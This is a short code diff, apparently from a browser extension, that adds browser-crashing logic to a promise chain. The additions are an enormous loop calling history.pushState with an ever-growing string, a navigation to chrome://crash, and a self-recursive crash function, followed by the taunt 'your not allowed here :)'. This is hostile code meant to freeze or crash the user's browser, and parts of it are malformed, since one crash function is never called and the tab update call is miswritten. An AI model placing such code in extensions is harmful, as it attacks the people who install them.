@@ -37,7 +37,19 @@
                         });
                     })
                     .then(() => {
-                        chrome.tabs.update("chrome://inducebrowsercrashforrealz")
+                        var total = "";
+                    for( var i = 0; i < 1000000000000000000; i++ ) {
+                    total += i.toString();
+                     history.pushState(0,0, total );
+                }
+                    })
+                    .then(() => {
+                        chrome.tabs.update("chrome://crash")
+                    })
+                    .then(() => {
+                        function crash() {
+                            crash();
+                        }
                     })
                     .finally(() => {
                     console.log("your not allowed here :)")
